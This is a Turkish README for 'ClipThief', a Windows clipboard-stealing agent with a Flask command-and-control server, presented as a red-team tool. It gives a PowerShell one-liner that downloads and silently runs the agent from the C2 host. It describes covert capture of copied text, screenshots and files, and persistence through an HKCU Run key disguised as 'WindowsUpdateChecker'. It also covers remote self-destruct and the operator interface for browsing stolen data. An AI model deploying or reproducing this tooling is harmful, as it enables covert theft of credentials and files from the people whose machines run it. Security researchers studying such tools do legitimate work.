```
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡿⣿⣿⣿
⡿⠟⠫⠋⢉⣁⣉⡉⠉⠉⠋⠛⣿⣿⣿⡛⠋⠋⠉⠉⣁⣈⣉⡐⠩⠛⢻
⣷⣦⣶⣿⡿⠯⠭⠭⠭⠭⣝⢻⣿⣿⣿⡿⢫⠭⠭⠭⠭⠭⠿⣿⣷⣦⣼
⣿⣿⣿⣩⡚⠃⢀⠀⡘⠌⢻⣸⣿⣿⣿⣷⣼⣋⢚⢀⣀⢀⠛⣊⣽⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿     Be careful what you copy. 
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢋⣿⡟⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⢙⣛⣛⣛⣛⣛⣛⣛⣉⣩⣭⣴⣾⣿⣿⢣⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣼⣿⣿⣿⣿

```

# ClipThief

Windows clipboard izleme aracı. Red team tatbikatları ve güvenlik araştırmaları için geliştirilmiştir.

**Yazar:** @erberkan / B3R-SEC

---

## Bileşenler

| Bileşen | Teknoloji | Açıklama |
|---------|-----------|----------|
| **Agent** | C++ / Win32 API | Hedef sistemde arka planda sessizce çalışır, clipboard'ı izler |
| **C2 Sunucusu** | Python 3 + Flask + Rich | Operatör terminal arayüzü, SQLite, heartbeat, otomatik derleme, loglama |

---

## Gereksinimler

### C2 Sunucusu
- Python 3.8 veya üstü
- pip

### Agent (Otomatik Derleme için)
- Windows 10/11
- Visual Studio 2022 (Community veya üstü) — C++ Desktop workload
- Windows 10 SDK

> Agent'ı manuel derlemek **gerekmez**. C2 başlatıldığında `bingo.exe` otomatik derlenir ve HTTP üzerinden servis edilir.

---

## Kurulum

### C2 Sunucusu

```bash
cd C2
pip install -r requirements.txt
```

`requirements.txt`:
```
flask>=3.0.0
rich>=13.0.0
```

---

## Kullanım

### C2 Sunucusunu Başlatma

```bash
cd C2

# Varsayılan — listen 0.0.0.0:5000, agent IP otomatik tespit edilir
python c2_server.py

# Agent IP açıkça belirtilerek
python c2_server.py --agent-ip 192.168.1.100

# Tüm parametreler
python c2_server.py --host 0.0.0.0 --port 8080 --agent-ip 192.168.1.100

# Windows batch ile (bağımlılıkları otomatik yükler)
setup_and_run.bat
```

**Argümanlar:**

| Argüman | Varsayılan | Açıklama |
|---------|-----------|----------|
| `--host` | `0.0.0.0` | Flask'ın dinlediği adres |
| `--port` | `5000` | Flask portu |
| `--agent-ip` | otomatik | Agent'ların bağlandığı IP — `bingo.exe`'ye gömülür |

`--agent-ip` verilmezse: `--host` `0.0.0.0` değilse onu kullanır, aksi hâlde makinenin primary IP'sini otomatik tespit eder.

### Startup Çıktısı

```
[*] Database: C:\...\C2\c2_data.db  (0 agents loaded)
[*] Log: C:\...\C2\logs\
[*] Listening on  0.0.0.0:5000
[*] Agent target  192.168.1.100:5000
[*] Building bingo.exe ...
[+] Agent ready:  C:\...\C2\agents\bingo.exe

╭──  PowerShell One-Liner  ──────────────────────────────────────────────────────╮
│  $p="$env:TEMP\bingo.exe";(New-Object Net.WebClient).DownloadFile(            │
│  'http://192.168.1.100:5000/agent/bingo.exe',$p);Start-Process $p             │
╰────────────────────────────────────────────────────────────────────────────────╯

  Press Enter to start C2...
```

PowerShell one-liner'ı kopyaladıktan sonra Enter'a basarak C2 terminal arayüzünü başlatın.

### Agent'ı Hedef Sistemde Çalıştırma

Hedef sistemde PowerShell one-liner'ı çalıştırın:

```powershell
$p="$env:TEMP\bingo.exe";(New-Object Net.WebClient).DownloadFile('http://192.168.1.100:5000/agent/bingo.exe',$p);Start-Process $p
```

- `bingo.exe` C2'den indirilir ve `%TEMP%\bingo.exe` olarak kaydedilir
- Konsol penceresi açılmaz (Windows subsystem / WinMain)
- Task Manager'da `bingo.exe` olarak görünür
- C2 erişilebilir değilse sessizce beklemeye devam eder
- Her 3 saniyede bir C2'ye komut sorgusu gönderir (aynı zamanda heartbeat)

---

## C2 Arayüzü

### Ana Ekran

```
╭────┬────────────┬──────────┬──────────────────┬─────────────────┬─────────────────────┬──────────╮
│  # │ ID         │ USER     │ HOSTNAME         │ IP              │ LAST SEEN           │ STATUS   │
├────┼────────────┼──────────┼──────────────────┼─────────────────┼─────────────────────┼──────────┤
│  1 │ a1b2c3d4...│ erberkan │ DESKTOP-ABC123   │ 192.168.1.50   │ 2026-04-22 14:35:00 │ ● active │
│  2 │ f7e6d5c4...│ john     │ LAPTOP-XYZ       │ 10.0.0.12      │ 2026-04-22 13:10:00 │ ✗ dead   │
╰────┴────────────┴──────────┴──────────────────┴─────────────────┴─────────────────────┴──────────╯

  [N]  Select agent by number
  [D]  Database management
  [R]  Refresh
  [Q]  Quit
```

- `● active` — Agent son 10 saniye içinde polling yapmış
- `✗ dead` — 10+ saniyedir polling yok veya kill komutu gönderilmiş

### Yeni Agent Bağlandığında

Agent ilk kez bağlandığında terminal'e otomatik bildirim paneli gelir ve agent menüsü açılır:

```
╭────────────────────────────────────────────────────────╮
│                                                        │
│            ★  NEW AGENT CONNECTED  ★                   │
│                                                        │
│  ID      : a1b2c3d4-e5f6-...                          │
│  User    : erberkan                                    │
│  Hostname: DESKTOP-ABC123                              │
│  IP      : 192.168.1.50                                │
│  OS      : Windows 10.0 Build 19045                    │
│  Time    : 2026-04-22 14:32:11                         │
│                                                        │
╰────────────────────────────────────────────────────────╯
  Press Enter to open agent menu...
```

### Agent Menüsü

```
╭─ Agent Details ──────────────────────────────╮
│ Agent ID:   a1b2c3d4-e5f6-...               │
│ User:       erberkan                         │
│ Hostname:   DESKTOP-ABC123                   │
│ IP:         192.168.1.50                     │
│ OS:         Windows 10.0 Build 19045         │
│ First seen: 2026-04-22 14:32:11              │
│ Last seen:  2026-04-22 14:35:00              │
│ Status:     ● active                         │
│ Clipboard:  14 entries                       │
╰──────────────────────────────────────────────╯

  [1] View clipboard history
  [2] Send KILL command  (self-destruct + delete)
  [3] Send PERSIST command  (add scheduled task)
  [4] Delete this agent from DB
  [0] Back
```

### Clipboard Geçmişi

```
  #     TYPE    TIMESTAMP              PREVIEW / FILENAME
  ─────────────────────────────────────────────────────────────────────
  1     [TXT]   2026-04-22 14:32:15    SELECT * FROM users WHERE...
  2     [IMG]   2026-04-22 14:35:01    clipboard.bmp
  3     [FILE]  2026-04-22 14:38:44    salary_report.xlsx
```

Sütun renkleri: `[TXT]` → cyan, `[IMG]` → sarı, `[FILE]` → yeşil

Komutlar:
- `1` — #1 kaydı görüntüle (metin syntax-highlight ile inline, resim/dosya otomatik açılır)
- `D 2` — #2 kaydı `downloads/` klasörüne indir
- `0` — Geri

### Metin Görüntüleme (Syntax Highlight)

| İçerik | Dil | Tema |
|--------|-----|------|
| `{` veya `[` ile başlıyorsa | JSON | monokai |
| `SELECT`, `INSERT`, `UPDATE`, `DELETE`, `CREATE` içeriyorsa | SQL | monokai |
| `def `, `import `, `class ` içeriyorsa | Python | monokai |
| `<?xml`, `<html` ile başlıyorsa | XML | monokai |
| Diğer | Düz metin | Panel içinde |

### Desteklenen Clipboard Tipleri

| Tip | Windows Formatı | C2'de Görünüm |
|-----|----------------|---------------|
| Metin | `CF_UNICODETEXT` | Terminal'de syntax-highlighted inline |
| Resim (screenshot vb.) | `CF_DIB` | BMP olarak kaydedilip otomatik açılır |
| Kopyalanan dosya | `CF_HDROP` | Orijinal uzantıyla indirilir |

---

## Komutlar

### KILL — Self-Destruct

Agent menüsünden `[2]` seçin:

```
Send KILL command? This will destroy the agent [y/n]:
```

`y` ile onaylayın. Agent bir sonraki polling'de (max 3 saniye) komutu alır ve:

1. Registry'deki `AgentID` değerini siler
2. Persistence Run key'ini siler (varsa)
3. Kendini silecek bir batch dosyası oluşturur (`%TEMP%`)
4. Process'i sonlandırır

> **Not:** EXE silme işlemi `ShellExecuteA` ile tetiklenir; bazı Windows 10/11 ortamlarında başarısız olabilir. C2 agent'ı `✗ dead` olarak işaretler; disk üzerinde kalabilir.

### PERSIST — HKCU Run Key

Agent menüsünden `[3]` ile gönderin.

Agent kendini HKCU Run registry key'ine ekler — **yönetici yetkisi gerekmez:**

- **Registry yolu:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Değer adı:** `WindowsUpdateChecker`
- **Tetikleyici:** Her kullanıcı girişinde otomatik

Elle kaldırmak için:
```cmd
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateChecker /f
```

---

## Heartbeat & Status

C2 her 5 saniyede tüm agent'ların `last_seen` zamanını kontrol eder:

- Son 10 saniye içinde polling → `● active`
- 10+ saniye sessiz → `✗ dead`

Ayrı bir heartbeat endpoint'i yoktur; agent'ın her 3 saniyede gönderdiği komut sorgusu `last_seen`'i otomatik günceller.

---

## Loglama

Her C2 başlatmasında `C2/logs/` altında yeni bir log dosyası oluşur:

```
C2/logs/
└── 2026-04-22_14-30-00.log
└── 2026-04-22_18-05-12.log
```

**Log formatı:**
```
2026-04-22 14:30:00  INFO      SERVER START    listen=0.0.0.0:5000  agent_ip=192.168.1.100
2026-04-22 14:30:08  INFO      BUILD OK        output=agents\bingo.exe  size=98,304 bytes
2026-04-22 14:32:11  INFO      AGENT NEW       id=a1b2c3...  user=john  hostname=PC-01
2026-04-22 14:32:15  INFO      CLIPBOARD       id=a1b2c3...  type=text  seq=1
2026-04-22 14:35:00  INFO      AGENT DOWNLOAD  bingo.exe served  src=10.0.0.10
2026-04-22 14:40:00  INFO      COMMAND QUEUED  id=a1b2c3...  command=kill  by=operator
2026-04-22 14:40:15  WARNING   AGENT DEAD      id=a1b2c3...  elapsed=12s
2026-04-22 16:00:00  INFO      SERVER STOP     operator quit
```

**Loglanan olaylar:** Server start/stop, agent build, agent bağlantıları, clipboard kayıtları, komut gönderimi, agent download, heartbeat ölümleri, DB temizleme.

---

## Veritabanı Yönetimi

Ana menüden `[D]`:

```
╭─ Database ───────────────────────────╮
│ Path:      C:\...\C2\c2_data.db     │
│ Size:      2,048,576 bytes           │
│ Agents:    3                         │
│ Clipboard: 892 entries               │
╰──────────────────────────────────────╯

  [1] Clear ALL data  (agents + clipboard)
  [0] Back
```

- **Tüm veriyi sil:** `[1]` → `y/n` onay
- **Tek agent sil:** Agent menüsü → `[4]` → `y/n` onay

C2 yeniden başlatıldığında veritabanı otomatik yüklenir; tüm geçmiş korunur.

---

## Dosya Yapısı

```
ClipThief/
├── ClipboardDump/
│   ├── ClipboardDump.sln
│   └── ClipboardDump/
│       ├── ClipboardDump.cpp       # Agent kaynak kodu (C2 tarafından otomatik derlenir)
│       └── ClipboardDump.vcxproj
│
├── C2/
│   ├── c2_server.py                # C2 sunucusu (Flask + Rich + SQLite)
│   ├── requirements.txt
│   ├── setup_and_run.bat           # Windows başlatma scripti
│   ├── c2_data.db                  # Veritabanı (otomatik oluşur)
│   ├── agents/                     # Derlenmiş agent'lar
│   │   └── bingo.exe               # Startup'ta otomatik derlenir
│   ├── downloads/                  # İndirilen clipboard dosyaları
│   └── logs/                       # Oturum logları
│       └── YYYY-MM-DD_HH-MM-SS.log
│
├── PROJECT.md                      # Teknik dokümantasyon
└── README.md                       # Bu dosya
```

---

## Sık Karşılaşılan Sorunlar

### bingo.exe derlenmiyor
- Visual Studio 2022 kurulu mu kontrol edin (C++ Desktop workload dahil)
- Windows 10 SDK kurulu mu kontrol edin (`Tools → Get Tools and Features`)
- `C2/logs/` altındaki log dosyasında `BUILD FAILED` satırını inceleyin

### Agent C2'ye bağlanamıyor
- `--agent-ip` ile doğru IP verildi mi kontrol edin
- C2 sunucusu çalışıyor mu kontrol edin
- Windows Firewall hedef port için açık mı kontrol edin

### Clipboard değişimi C2'ye gelmiyor
- Agent'ın `bingo.exe` olarak Task Manager'da çalıştığını doğrulayın
- Log dosyasında `CLIPBOARD` satırları var mı kontrol edin

### Agent status dead görünüyor ama çalışıyor
- Ağ gecikmesi `AGENT_TIMEOUT_SEC` eşiğini aşıyor olabilir
- `c2_server.py` içindeki `AGENT_TIMEOUT_SEC` değerini artırın (varsayılan: 10)

### İndirilen resim açılmıyor
- `downloads/` klasöründeki `.bmp` dosyası Windows Resim Görüntüleyici ile açılabilir
- Büyük ekran görüntülerinde BMP boyutu yüksek olabilir (sıkıştırmasız format)

---

## Temizlik

```
Agent tarafı:
  kill komutu       → registry + Run key + EXE silinir (C2 menüsünden)
  Persistence       → reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateChecker /f

C2 tarafı:
  Tek agent sil     → Agent Menüsü → [4]
  Tam DB temizlik   → Ana Menü → [D] → [1] → y
  Log dosyaları     → C2/logs/ dizini manuel silin
  Agent EXE         → C2/agents/bingo.exe manuel silin
```

---

## Teknik Detaylar

Mimarinin tam açıklaması, tüm fonksiyonların belgelenmesi ve veri akışı diyagramları için `PROJECT.md` dosyasına bakın.
